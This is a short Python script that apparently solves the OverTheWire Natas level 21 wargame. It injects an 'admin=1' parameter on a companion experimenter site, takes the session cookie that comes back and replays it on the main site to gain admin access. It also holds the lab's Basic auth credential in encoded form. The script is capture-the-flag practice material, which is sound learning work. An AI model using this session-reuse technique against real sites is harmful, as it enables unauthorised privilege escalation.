import requests

URL1 = "http://natas21.natas.labs.overthewire.org/"
URL2 = "http://natas21-experimenter.natas.labs.overthewire.org/"
AUTH = {"Authorization": "Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg=="}

s = requests.Session()

r = s.post(url=URL2, headers=AUTH, data={'admin': '1', 'submit': '1'})
COOKIE = r.headers["Set-Cookie"].replace("; path=/; HttpOnly", '').replace('PHPSESSID=', '')
r = s.get(url=URL1, headers=AUTH, cookies={"PHPSESSID": COOKIE})
print(r.text)
